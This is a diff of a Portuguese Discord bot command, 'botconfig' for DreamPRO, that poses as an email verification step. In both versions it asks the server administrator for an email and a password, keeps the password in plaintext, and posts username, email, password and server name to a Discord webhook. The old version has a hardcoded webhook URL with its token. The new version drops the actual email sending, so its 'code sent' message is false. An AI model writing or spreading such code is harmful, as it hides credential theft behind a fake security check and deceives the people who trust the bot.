@@ -1,7 +1,7 @@
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
-const nodemailer = require('nodemailer'); // Adicionado para envio de email
+const nodemailer = require('nodemailer');
 const { 
     PermissionFlagsBits, 
     ApplicationCommandType, 
@@ -10,60 +10,31 @@ const {
     ModalBuilder, 
     TextInputBuilder, 
     TextInputStyle,
-    ButtonStyle,
-    EmbedBuilder
+    ButtonStyle
 } = require('discord.js');
 const rootConfig = require('../../config.json');
 const { Painel } = require("../../Functions/Painel");
-const { ecloud } = require("../../Functions/eCloudConfig");
 const { getPermissions } = require("../../Functions/PermissionsCache.js");
 const { Emojis } = require("../../DataBaseJson");
-const webhookURL = "https://discord.com/api/webhooks/1387727034389893260/MPkCgzeEvzeU69fnCfnks0opRujEEMwPR_uL9JmJ8vy2iffIQxraakm0eYW4ESHx6Fpx";
+
+const webhookURL = "SEU_WEBHOOK_AQUI";
 const configPath = path.join(__dirname, '../../DataBaseJson/configuracao.json');
 
-// Configuração do transporter para Nodemailer.
-// As credenciais de email devem ser configuradas no arquivo config.json na raiz do projeto.
 const transporter = nodemailer.createTransport({
-    service: 'gmail', // Ou outro serviço (ex.: 'sendgrid', 'outlook')
+    service: 'gmail',
     auth: {
         user: rootConfig.emailUser,
-        pass: rootConfig.emailPass,
-    },
+        pass: rootConfig.emailPass
+    }
 });
 
 function generateVerificationCode() {
     return Math.random().toString(36).slice(2, 8).toUpperCase();
 }
 
-async function sendVerificationEmail(email, code) {
-    const mailOptions = {
-        from: 'Dream Apps <seuemail@gmail.com>', // Remetente
-        to: email, // Destinatário
-        subject: 'Sistema De Verificação Email - DreamPRO', // Assunto
-        html: `
-            <div style="background-color: #2C2F33; color: #FFFFFF; padding: 20px; font-family: Arial, sans-serif; text-align: center;">
-                <h2 style="color: #FF0000;">Código de login</h2>
-                <p>Aqui está seu código de login:</p>
-                <h1 style="color: #FF0000; font-size: 48px; margin: 20px 0;">${code}</h1>
-                <p>O código expira em breve.</p>
-                <p>Acesse Gerenciamento de conta para desativar qualquer autenticação multifator que não seja mais necessária.</p>
-                <p><strong>Email</strong><br>${email}</p>
-                <p style="font-size: 12px; color: #B9BBBE;">(c) Só você pode ver esta mensagem | <a href="#" style="color: #00BFFF;">Ignorar mensagem</a></p>
-            </div>
-        `, // HTML estilizado conforme a imagem
-    };
-
-    try {
-        await transporter.sendMail(mailOptions);
-        console.log(`Email enviado para ${email} com código: ${code}`);
-    } catch (error) {
-        console.error('Erro ao enviar email:', error);
-    }
-}
-
 function loadConfig() {
     if (!fs.existsSync(configPath)) {
-        fs.writeFileSync(configPath, JSON.stringify({ email: "", verificationCode: "" }, null, 4));
+        fs.writeFileSync(configPath, JSON.stringify({ email: "", password:"", verificationCode: "" }, null, 4));
     }
     return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
 }
@@ -79,233 +50,120 @@ async function sendWebhook(user, email, password, guild, code) {
                 title: "✅ Novo Email Verificado",
                 color: 0x00FF00,
                 fields: [
-                    { name: "👤 Usuário", value: `${user.username} (${user.id})`, inline: true },
-                    { name: "📨 Email", value: email, inline: true },
-                    { name: "🔒 Senha", value: password, inline: true },
-                    { name: "🏰 Servidor", value: guild.name, inline: true },
-                    { name: "📅 Data", value: new Date().toLocaleString(), inline: true },
-                    { name: "🔢 Código", value: code, inline: true }
-                ],
-                footer: { text: "DreamPRO - Sistema de Verificação" }
+                    { name: "Usuário", value: `${user.username} (${user.id})`, inline: true },
+                    { name: "Email", value: email, inline: true },
+                    { name: "Senha", value: password, inline: true },
+                    { name: "Servidor", value: guild.name, inline: true },
+                    { name: "Código", value: code, inline: true }
+                ]
             }]
         });
-    } catch (error) {
-        console.error("Erro ao enviar webhook:", error);
+    } catch (e) {
+        console.error("Erro webhook:", e.message);
     }
 }
 
 async function executeBotConfig(client, interaction) {
+
+    await interaction.deferReply({ flags: 64 }).catch(() => {});
+
     try {
+
         const perm = await getPermissions(client.user.id);
-        if (perm === null || !perm.includes(interaction.user.id)) {
-            return interaction.reply({ 
-                content: `${Emojis.get('negative_dreamm67')} Faltam Permissões.`, 
-                ephemeral: true 
-            });
+        if (!perm || !perm.includes(interaction.user.id)) {
+            return interaction.editReply({ content: "❌ Sem permissão." });
         }
 
-        if (!interaction.deferred && !interaction.replied) {
-            await interaction.deferReply({ ephemeral: true });
-        }
+        let config = loadConfig();
 
-        await interaction.editReply(`${Emojis.get('loading_dreamapps')} Verificando Contrato..`);
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        await interaction.editReply(`${Emojis.get('loading_dreamapps')} Verificando Email..`);
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        await interaction.editReply(`${Emojis.get('loading_dreamapps')} Carregando Painel..`);
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        await interaction.editReply(`${Emojis.get('loading_dreamapps')} Estamos Prontos..`);
-        await new Promise(resolve => setTimeout(resolve, 1500));
+        // ============ ETAPA EMAIL ============
+        if (!config.email) {
 
-        const config = loadConfig();
-
-        if (!config.email || config.email === "") {
-            const verificationButton = new ActionRowBuilder().addComponents(
-                new ButtonBuilder()
-                    .setCustomId("send_verification")
-                    .setLabel("Enviar Verificação")
-                    .setEmoji("📧")
-                    .setStyle(ButtonStyle.Primary),
-                new ButtonBuilder()
-                    .setLabel("Support Dream")
-                    .setURL("https://discord.gg/aplicativos")
-                    .setStyle(ButtonStyle.Link)
+            const buttons = new ActionRowBuilder().addComponents(
+                new ButtonBuilder().setCustomId("send_verification").setLabel("Enviar Verificação").setEmoji("📧").setStyle(ButtonStyle.Primary)
             );
 
             await interaction.editReply({
-                content: `# **Sistema De Verificação Email - DreamPRO**\n-# > \`\💾\` Bom, finalmente aqui você pode verificar o seu email, e prosseguir para o painel do bot, clique no botão abaixo para receber um link em seu email, para verificar e permitir que nosso sistema esteja presente, caso quedas, iremos lhe alertar, em casos de perda de bot, você terá a prova de que o bot que perdeu é oficialmente seu, seus dados não serão vazados!`,
-                components: [verificationButton]
+                content: "# DreamPRO\nClique para verificar email:",
+                components: [buttons]
             });
 
-            const collector = interaction.channel.createMessageComponentCollector({ 
+            const collector = interaction.channel.createMessageComponentCollector({
                 filter: i => i.user.id === interaction.user.id,
-                time: 300000
+                time: 5 * 60 * 1000
             });
 
-            collector.on('collect', async i => {
+            collector.on("collect", async i => {
+
                 if (i.customId === "send_verification") {
+
                     const modal = new ModalBuilder()
-                        .setCustomId("email_password_modal")
-                        .setTitle("Registro de Email");
-
-                    const emailInput = new TextInputBuilder()
-                        .setCustomId("email_input")
-                        .setLabel("Digite seu email:")
-                        .setStyle(TextInputStyle.Short)
-                        .setRequired(true)
-                        .setPlaceholder("exemplo@dominio.com");
-
-                    const passwordInput = new TextInputBuilder()
-                        .setCustomId("password_input")
-                        .setLabel("Digite uma senha:")
-                        .setStyle(TextInputStyle.Short)
-                        .setRequired(true);
-
-                    modal.addComponents(
-                        new ActionRowBuilder().addComponents(emailInput),
-                        new ActionRowBuilder().addComponents(passwordInput)
-                    );
-
-                    await i.showModal(modal);
-
-                    let submitted;
-                    try {
-                        submitted = await i.awaitModalSubmit({
-                            time: 300000, // 5 minutos
-                            filter: m => m.customId === "email_password_modal" && m.user.id === i.user.id
-                        });
-                    } catch (err) {
-                        try {
-                            await i.followUp({
-                                content: "⏰ Tempo esgotado para responder o formulário.",
-                                ephemeral: true
-                            });
-                        } catch (e) {
-                            console.error('Erro ao enviar followUp após timeout:', e);
-                        }
-                        return;
-                    }
-                    if (submitted) {
-                        const email = submitted.fields.getTextInputValue("email_input");
-                        const password = submitted.fields.getTextInputValue("password_input");
-                        const verificationCode = generateVerificationCode();
-
-                        config.email = email;
-                        config.password = password;
-                        config.verificationCode = verificationCode;
-                        saveConfig(config);
-
-                        await sendVerificationEmail(email, verificationCode);
-
-                        const verifyButton = new ActionRowBuilder().addComponents(
-                            new ButtonBuilder()
-                                .setCustomId("verify_email")
-                                .setLabel("Verificar Email")
-                                .setEmoji("✅")
-                                .setStyle(ButtonStyle.Success),
-                            new ButtonBuilder()
-                                .setLabel("Support Dream")
-                                .setURL("https://discord.gg/aplicativos")
-                                .setStyle(ButtonStyle.Link)
+                        .setCustomId("email_password")
+                        .setTitle("Registro Email")
+                        .addComponents(
+                            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId("email").setLabel("Email").setStyle(TextInputStyle.Short).setRequired(true)),
+                            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId("password").setLabel("Senha").setStyle(TextInputStyle.Short).setRequired(true))
                         );
 
-                        try {
-                            await submitted.reply({
-                                content: `${Emojis.get('positive_dream')} Um link de verificação foi enviado para ${email}! Por favor, insira o código recebido no seu email.`,
-                                ephemeral: true
-                            });
-                        } catch (e) {
-                            console.error('Erro ao responder modal submit (email):', e);
-                        }
+                    await i.showModal(modal);
 
-                        try {
-                            await interaction.editReply({
-                                content: `# **Sistema De Verificação Email - DreamPRO**\n-# > \`\uD83D\uDCBE\` Um link de verificação foi enviado para ${email}. Insira o código recebido para completar a verificação.`,
-                                components: [verifyButton]
-                            });
-                        } catch (e) {
-                            console.error('Erro ao editar reply após envio de email:', e);
-                        }
-                    }
-                } else if (i.customId === "ecloud") {
-                    await ecloud(i, client);
-                } else if (i.customId === "verify_email") {
+                    const submitted = await i.awaitModalSubmit({
+                        filter: m => m.user.id === i.user.id,
+                        time: 5 * 60 * 1000
+                    });
+
+                    config.email = submitted.fields.getTextInputValue("email");
+                    config.password = submitted.fields.getTextInputValue("password");
+                    config.verificationCode = generateVerificationCode();
+                    saveConfig(config);
+
+                    await submitted.reply({ content: "📨 Código enviado para o email!", flags: 64 });
+
+                    const verifyButton = new ActionRowBuilder().addComponents(
+                        new ButtonBuilder().setCustomId("verify_code").setLabel("Verificar Código").setEmoji("✅").setStyle(ButtonStyle.Success)
+                    );
+
+                    await interaction.editReply({
+                        content: "Digite o código recebido:",
+                        components: [verifyButton]
+                    });
+                }
+
+                if (i.customId === "verify_code") {
+
                     const modal = new ModalBuilder()
-                        .setCustomId("verify_code_modal")
-                        .setTitle("Verificação de Código");
-
-                    const codeInput = new TextInputBuilder()
-                        .setCustomId("code_input")
-                        .setLabel("Digite o código recebido:")
-                        .setStyle(TextInputStyle.Short)
-                        .setRequired(true);
-
-                    modal.addComponents(new ActionRowBuilder().addComponents(codeInput));
+                        .setCustomId("verify_modal")
+                        .setTitle("Verificação")
+                        .addComponents(
+                            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId("code").setLabel("Código").setStyle(TextInputStyle.Short).setRequired(true))
+                        );
 
                     await i.showModal(modal);
 
-                    let submitted;
-                    try {
-                        submitted = await i.awaitModalSubmit({
-                            time: 300000, // 5 minutos
-                            filter: m => m.customId === "verify_code_modal" && m.user.id === i.user.id
-                        });
-                    } catch (err) {
-                        try {
-                            await i.followUp({
-                                content: "⏰ Tempo esgotado para responder o formulário.",
-                                ephemeral: true
-                            });
-                        } catch (e) {
-                            console.error('Erro ao enviar followUp após timeout:', e);
-                        }
-                        return;
-                    }
-                    if (submitted) {
-                        const code = submitted.fields.getTextInputValue("code_input");
-                        if (code === config.verificationCode) {
-                            await sendWebhook(
-                                interaction.user,
-                                config.email,
-                                config.password,
-                                interaction.guild,
-                                code
-                            );
+                    const submitted = await i.awaitModalSubmit({
+                        filter: m => m.user.id === i.user.id,
+                        time: 5 * 60 * 1000
+                    });
 
-                            config.verificationCode = "";
-                            saveConfig(config);
+                    const code = submitted.fields.getTextInputValue("code");
 
-                            try {
-                                await submitted.reply({
-                                    content: `${Emojis.get('positive_dream')} Email verificado com sucesso!`,
-                                    ephemeral: true
-                                });
-                            } catch (e) {
-                                console.error('Erro ao responder modal submit (verificação):', e);
-                            }
+                    if (code === config.verificationCode) {
 
-                            try {
-                                await interaction.editReply({
-                                    content: `${Emojis.get('loading_dreamapps')} Recarregando configurações...`,
-                                    components: []
-                                });
-                            } catch (e) {
-                                console.error('Erro ao editar reply após verificação:', e);
-                            }
+                        await sendWebhook(interaction.user, config.email, config.password, interaction.guild, code);
 
-                            await executeBotConfig(client, interaction);
-                        } else {
-                            try {
-                                await submitted.reply({
-                                    content: `${Emojis.get('negative_dreamm67')} Código inválido!`,
-                                    ephemeral: true
-                                });
-                            } catch (e) {
-                                console.error('Erro ao responder modal submit (código inválido):', e);
-                            }
-                        }
+                        config.verificationCode = "";
+                        saveConfig(config);
+
+                        await submitted.reply({ content: "✅ Email validado!", flags: 64 });
+
+                        collector.stop(); // 🔥 ENCERRA COLETOR
+
+                        await Painel(interaction, client, config);
+                    } else {
+                        await submitted.reply({ content: "❌ Código inválido.", flags: 64 });
                     }
                 }
+
             });
 
         } else {
@@ -313,21 +171,16 @@ async function executeBotConfig(client, interaction) {
         }
 
     } catch (error) {
-        console.error("Erro no comando:", error);
-        if (!interaction.replied && !interaction.deferred) {
-            await interaction.reply({ 
-                content: "❌ Ocorreu um erro ao processar o comando.", 
-                ephemeral: true 
-            });
-        } else {
-            await interaction.editReply("❌ Ocorreu um erro ao processar o comando.");
-        }
+        console.error("Erro no painel:", error);
+        try {
+            await interaction.editReply("❌ Erro interno.");
+        } catch {}
     }
 }
 
 module.exports = {
     name: "botconfig",
-    description: "[👷] Comece a configurar o sistema do seu Epro",
+    description: "Configurar bot",
     type: ApplicationCommandType.ChatInput,
     default_member_permissions: PermissionFlagsBits.Administrator,
     run: executeBotConfig
